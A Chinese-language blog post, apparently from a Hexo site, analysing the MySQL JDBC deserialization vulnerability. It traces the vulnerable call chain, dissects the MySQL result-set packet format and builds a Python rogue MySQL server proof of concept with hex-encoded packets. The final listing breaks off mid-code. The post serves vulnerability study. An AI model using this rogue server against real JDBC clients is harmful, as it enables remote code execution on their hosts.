@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>JDBC反序列化漏洞分析&amp;POC编写 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="JDBC反序列化漏洞分析&amp;POC编写一、漏洞简介​    在BlackHat Europe 2019议题中，提及到了MySQL JDBC反序列化漏洞。针对不同的版本，有不同的利用方式。 二、利用链分析​    首先分析一下mysql 8.0.14版本环境下的利用方式。从一个漏洞挖掘者的视角，来对整个调用链做一个分析。 ​    在Java中，如果想要触发反序列化，我们需要调用readObj">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDBC反序列化漏洞分析&amp;POC编写">
+<meta property="og:url" content="http://example.com/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="JDBC反序列化漏洞分析&amp;POC编写一、漏洞简介​    在BlackHat Europe 2019议题中，提及到了MySQL JDBC反序列化漏洞。针对不同的版本，有不同的利用方式。 二、利用链分析​    首先分析一下mysql 8.0.14版本环境下的利用方式。从一个漏洞挖掘者的视角，来对整个调用链做一个分析。 ​    在Java中，如果想要触发反序列化，我们需要调用readObj">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112222551704.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223030048.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112224039235.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112233233208.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111639006.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111829934.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113100319423.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112502061.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112739415.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113121901554.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113131216243.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113134413031.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113143110175.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113135808743.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113142408784.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113212542880.png">
+<meta property="article:published_time" content="2022-01-13T13:46:00.000Z">
+<meta property="article:modified_time" content="2022-01-13T13:46:00.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112222551704.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-JDBC反序列化漏洞分析&amp;POC编写" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" class="article-date">
+  <time datetime="2022-01-13T13:46:00.000Z" itemprop="datePublished">2022-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      JDBC反序列化漏洞分析&amp;POC编写
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JDBC反序列化漏洞分析-amp-POC编写"><a href="#JDBC反序列化漏洞分析-amp-POC编写" class="headerlink" title="JDBC反序列化漏洞分析&amp;POC编写"></a><code>JDBC</code>反序列化漏洞分析&amp;<code>POC</code>编写</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>​    在<code>BlackHat Europe 2019</code>议题中，提及到了<code>MySQL JDBC</code>反序列化漏洞。针对不同的版本，有不同的利用方式。</p>
+<h2 id="二、利用链分析"><a href="#二、利用链分析" class="headerlink" title="二、利用链分析"></a>二、利用链分析</h2><p>​    首先分析一下<code>mysql 8.0.14</code>版本环境下的利用方式。从一个漏洞挖掘者的视角，来对整个调用链做一个分析。</p>
+<p>​    在<code>Java</code>中，如果想要触发反序列化，我们需要调用<code>readObject</code>方法，因此，在寻找整个利用链的过程中，首先需要定位到最后的触发点，也就是我们需要找到哪个地方调用了<code>readObject</code>方法。在该漏洞的利用过程中，最后用到的是<code>ResultSetImpl</code>的<code>getObject</code>方法，我们跟进该方法查看一下代码：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112222551704.png" alt="image-20220112222551704"></p>
+<p>​    可以发现这里调用了<code>readObject</code>方法，也就是说，如果这里的<code>data</code>变量我们可以控制的话，就可以利用反序列化链进行攻击。这里先不看这个的<code>data</code>如何进行控制，而是去寻找如何能够触发这个<code>getObject</code>方法。</p>
+<p>​    接下来我们找到了<code>ResultSetUtil.resultSetToMap</code>方法：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223030048.png" alt="image-20220112223030048"></p>
+<p>​    如果这里的<code>rs</code>变量传入的是<code>ResultSetImpl</code>对象的话，就可以调用到最上面的<code>getObject</code>方法。接下来需要继续寻找，哪个地方调用了<code>ResultSetUtil.resultSetToMap</code>，我们找到了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，其内部调用了上面的<code>ResultSetUtil.resultSetToMap</code>：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
+<p>​    然后我们继续检索，哪个地方调用了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，最后我们找到了<code>ServerStatusDiffInterceptor.preProcess</code>方法：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112224039235.png" alt="image-20220112224039235"></p>
+<p>​    该漏洞前面部分的利用链就到此为止了。在这里需要思考的一个问题是，这里的<code>preProcess</code>方法如何进行调用。这里参考一下官方文档，关于<code>MySQL Connector/J 8.0</code>连接串参数属性<code>https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-statements.html#cj-conn-prop_queryInterceptors</code>。</p>
+<p>​    大致解释一下这个<code>queryInterceptors</code>参数，就是指定一个或者多个实现了<code>com.mysql.cj.interceptors.QueryInterceptor</code>接口的类，然后在进行<code>SQL</code>查询操作之前，执行该类中的一个方法从而来影响最终的查询结果，而这个方法就是<code>preProcess</code>方法。（在查询完之后，还会调用其<code>postProcess</code>方法在此进行一个处理）</p>
+<p>​    这样，也就能够解释，为什么在构造<code>payload</code>的时候，需要在<code>URL</code>处指定一个<code>queryInterceptors</code>参数。此时还有一个问题，就是上面提到的这个参数，需要在进行<code>SQL</code>查询的时候才能进行触发，而在实际的利用过程中，只需要进行<code>getConnection</code>就能触发。通过简单的调试，可以发现在<code>getConnection</code>过程中，调用了查询语句：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112233233208.png" alt="image-20220112233233208"></p>
+<p>​    （我们将断点直接打在<code>ServerStatusDiffInterceptor.preProcess</code>这个方法上面，然后查看整个栈的情况，其实可以发现是通过调用了<code>NativeProtocol</code>类的一些方法后，最终调用了这个<code>preProcess</code>方法，从一个相对比较宏观的角度来看的话，可以按照上面的理解，在进行查询操作之前，就调用了<code>preProcess</code>方法进行了一个处理）</p>
+<h2 id="三、mysql数据包"><a href="#三、mysql数据包" class="headerlink" title="三、mysql数据包"></a>三、<code>mysql</code>数据包</h2><p>​    到这里，整个利用的思路就比较清楚了，接下来要做的就是怎么去构造数据，最终能够进行反序列化漏洞的利用。根据上面的分析，我们把关注点放到<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>这个上面：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
+<p>​    关键部分就是<code>rs</code>变量的构造，因为最后我们需要调用<code>rs.getObject</code>方法来进行触发。简单对整个代码进行分析，最后调用了<code>rs.getObject</code>方法，而在这个方法里面，<code>data</code>变量的值为执行查询语句后返回的表的第一列值（根据<code>columnIndex</code>）。我们对上述代码进行调试，当执行完<code>show session status</code>之后，如果可以执行<code>byte[] data = getBytes(columnIndex);</code>的话，那么<code>data</code>变量的值为：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111639006.png" alt="image-20220113111639006"></p>
+<p>​    转换成字符串的形式为<code>Aborted_clients</code>，其对应<code>show session status</code>的第一行第一列数据：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111829934.png" alt="image-20220113111829934"></p>
+<p>​    因此，我们的攻击思路是伪造一个<code>Fake Mysql</code>，然后当这里进行查询的时候，返回一个我们想要构造的数据。这里的难点就是如何返回指定的数据。我们在<code>rs</code>这里下一个断点，然后使用<code>wireshark</code>来捕获一下数据包：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113100319423.png" alt="image-20220113100319423"></p>
+<p>​    上面最后的两个数据包，就是客户端发送了请求，然后服务端返回给客户端信息。这里我们参考官方给出的返回结果集的数据包格式，来分析一下：<code>https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html</code></p>
+<p>​    这里给出的一个示例为查询<code>SELECT @@version_comment</code>后，数据包返回的数据解析，我们先给出在<code>mysql</code>命令行下，输入该命令的返回结果：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112502061.png" alt="image-20220113112502061"></p>
+<p>​    然后我们获取数据包，查看返回的数据结果：（这里返回了四个序列）</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112739415.png" alt="image-20220113112739415"></p>
+<p>​    根据官方文档的解释，我们对每个序列进行一个简单的介绍：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 第一个序列字段</span><br><span class="line">01 00 00 01 01</span><br><span class="line">前面三个字节表示数据长度，然后接一个01表示sequence id，最后一个01表示返回的列数</span><br><span class="line"></span><br><span class="line"># 第二个序列字段</span><br><span class="line">27 00 00 | 02 | 03 64 65 66 | 00 | 00 | 00 | 11 40 40 76</span><br><span class="line">65 72 73 69 6f 6e 5f 63 6f 6d 6d 65 6e 74 | 00 | 0c |</span><br><span class="line">21 00 | 54 00 00 00 | fd | 00 00 1f 00 00 </span><br><span class="line">这里便于区分，我用|进行分隔开:</span><br><span class="line">- 前面三个字节表示内容的长度</span><br><span class="line">- 02表示sequence id</span><br><span class="line">- 03 64 65 66为catalog</span><br><span class="line">- 00表示schema，不使用一般置为0</span><br><span class="line">- 00表示table</span><br><span class="line">- 00表示org_table</span><br><span class="line">- 下面一段的值为@@version_comment，可以对应我们查询的名称</span><br><span class="line">- 00表示org_name</span><br><span class="line">- 0c表示filter，通常为0c，不用改动</span><br><span class="line">- 21 00 表示character_set</span><br><span class="line">- 54 00 00 00表示column_length</span><br><span class="line">- fd表示column_type，这里是string的意思</span><br><span class="line">- 00 00表示flags</span><br><span class="line">- 1f表示decimals</span><br><span class="line">- 00 00表示filler_2</span><br><span class="line">（大致理解为第二个字段用于定义了返回表的字段的一些信息，比如字段名，字段值类型等）</span><br><span class="line"></span><br><span class="line"># 第三个序列字段</span><br><span class="line">1d 00 00 03 1c 4d 79 53 51 4c 20 43 6f 6d 6d 75 6e 69 74 79 20 53 65 72 76 65 72 20 2d 20 47 50 4c </span><br><span class="line">- 1d 00 00表示内容的长度</span><br><span class="line">- 03表示sequence id</span><br><span class="line">- 后面的部分表示具体的值，也就是对应的MySQL Community Server - GPL</span><br><span class="line">（可以理解为该字段用来定义表中的值）</span><br><span class="line"></span><br><span class="line"># 第四个序列字段</span><br><span class="line">07 00 00 04 fe 00 00 02 00 00 00</span><br><span class="line">- 07 00 00表示内容长度</span><br><span class="line">- 04表示sequence id</span><br><span class="line">- fe表示EOF</span><br><span class="line">- 00表示warning_count</span><br><span class="line">- 02 00表示status_flags，这里的意思为SERVER_STATUS_AUTOCOMMIT</span><br><span class="line">（这个字段主要用于表示结束）</span><br></pre></td></tr></table></figure>
+
+<p>​    通过上面的介绍，我们就可以大致了解每个字段的作用，即分别用于定义列数、列名以及列值。接下来我们就可以大致知道<code>POC</code>怎么进行编写了，一个简单的方式为我们直接把协议的返回字段拿下来，然后修改其中的一部分信息，返回给客户端，即可完成数据的构造（前面的认证过程返回的数据我们直接复制粘贴返回字段值即可）</p>
+<h2 id="四、Fake-Mysql编写"><a href="#四、Fake-Mysql编写" class="headerlink" title="四、Fake Mysql编写"></a>四、<code>Fake Mysql</code>编写</h2><p>​    接下来我们来编写一个完成认证过程的<code>Fake Mysql</code>服务端，可以直接粘贴获取<code>Response</code>数据包的值即可：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113121901554.png" alt="image-20220113121901554"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = &quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def startServer():</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    serverSocket.bind((&quot;0.0.0.0&quot;,3306))</span><br><span class="line">    serverSocket.listen(1)</span><br><span class="line">    print(&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;.format(&quot;0.0.0.0&quot;,&quot;3306&quot;))</span><br><span class="line">    while True:</span><br><span class="line">        # 获取到数据之后，开始进行交互</span><br><span class="line">        conn,addr = serverSocket.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(binascii.a2b_hex(GreetingInfo))</span><br><span class="line">        while True:</span><br><span class="line">            data = conn.recv(1024)</span><br><span class="line">            print(&quot;接收到数据：&#123;&#125;&quot;.format(data))</span><br><span class="line">            # login验证</span><br><span class="line">            if b&quot;mysql_native_password&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(login1))</span><br><span class="line">            elif b&quot;auto_increment_increment&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(loginValid))</span><br><span class="line">            elif b&quot;character_set_results&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resCharset))</span><br><span class="line">            elif b&quot;session.autocommit&quot; in data:</span><br><span class="line">                conn.send(binascii.a2b_hex(resAutoCommit))</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    startServer()</span><br></pre></td></tr></table></figure>
+
+<p>​    然后使用<code>jdbc</code>来进行连接，可以查看到客户端最后发送了一个<code>SHOW SESSION STATUS</code>的查询：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113131216243.png" alt="image-20220113131216243"></p>
+<p>​    根据前面的介绍，<code>SHOW SESSION STATUS</code>查询过后，如果能够执行<code>byte[] data = getBytes(columnIndex);</code>，<code>data</code>的值最后的结果为<code>Aborted_clients</code>，我们查找一下这个字符串，然后根据上面的分析，修改一下长度以及字符串内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># show session status返回值构造</span><br><span class="line">part1 = &quot;0100000102&quot;</span><br><span class="line">part2 = &quot;4c00000203646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730d5661726961626c655f6e616d650d5661726961626c655f6e616d650cff0000010000fd0110000000&quot;</span><br><span class="line">part3 = &quot;3c00000303646566000e73657373696f6e5f7374617475730e73657373696f6e5f7374617475730556616c75650556616c75650cff0000100000fd0000000000&quot;</span><br><span class="line"># part4就是我们想要构造部分，主要需要修改前三个字节、第5个字节以及中间的41626f727465645f636c69656e7473这个部分</span><br><span class="line"># 第五个字节表示构造字符串的长度，前三个字节表示的长度从第5个字节开始算起</span><br><span class="line">tmpPart4 = &quot;120000040f41626f727465645f636c69656e74730139&quot;</span><br><span class="line">part4 = &quot;090000&quot; + &quot;0406&quot; + &quot;6d31736e3077&quot; + &quot;0139&quot;</span><br><span class="line">part5 = &quot;070000b3fe000002000000&quot;</span><br><span class="line">resPayload = part1 + part2 + part3 + part4 + part5</span><br></pre></td></tr></table></figure>
+
+<p>​    关键就在于修改上面的<code>part4</code>，需要修改前三个字节，第5个字节，以及想要构造的<code>payload</code>，按照上面的构造完成之后，通过调试可以发现，最后的值替换成了<code>m1sn0w</code>：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113134413031.png" alt="image-20220113134413031"></p>
+<p>​    接下来开始正式构造<code>POC</code>，也就是我们需要开始控制条件语句，让其最终能够执行到<code>byte[] data = getBytes(columnIndex);</code>，并调用<code>readObject</code>方法，回到最终调用的<code>getObject</code>方法中：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113143110175.png" alt="image-20220113143110175"></p>
+<p>​    这里有三个主要的条件需要我们进行控制。第一个是获取的字段的<code>mysql</code>类型必须为<code>BIT</code>，关于<code>BIT</code>的描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * BIT[(M)]</span><br><span class="line"> * A bit-field type. M indicates the number of bits per value, from 1 to 64. The default is 1 if M is omitted.</span><br><span class="line"> * Protocol: FIELD_TYPE_BIT = 16</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+
+<p>​    前面在描述第二个序列的时候，有介绍到<code>fd</code>这个值，表示的就是<code>varchar</code>类型，我们查看一下官方文档，即<code>10</code>对应的就是<code>BIT</code>类型。</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113135808743.png" alt="image-20220113135808743"></p>
+<p>​    因此在最后构造<code>POC</code>的时候，只需要将<code>part2</code>后面的<code>fd</code>更改为<code>10</code>即可执行这个条件语句：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113142408784.png" alt="image-20220113142408784"></p>
+<p>​    第二个绕过部分为<code>autoDeserialize</code>，只需要设置<code>URL</code>参数为<code>autoDeserialize=true</code>即可。第三个部分就是判断我们构造的<code>payload</code>数据前两个字节是否为<code>-84</code>和<code>-19</code>，这其实就是序列化数据的标志。因此，最后的<code>POC</code>如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"># 对应第一个问候数据包，当监听到连接之后，发送给客户端</span><br><span class="line">GreetingInfo = &quot;4a0000000a382e302e31320013000000080c16437d1a144000ffffc00200ffc31500000000000000000000203c5f03322d4f4863566101006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line"></span><br><span class="line">login1 = &quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line"># 用户发送账号和密码后，验证成功的返回数据包</span><br><span class="line">loginValid = &quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span><br><span class="line"></span><br><span class="line">resCharset = &quot;0700000100000002000000&quot;</span><br><span class="line"></span><br><span class="line">resAutoCommit = 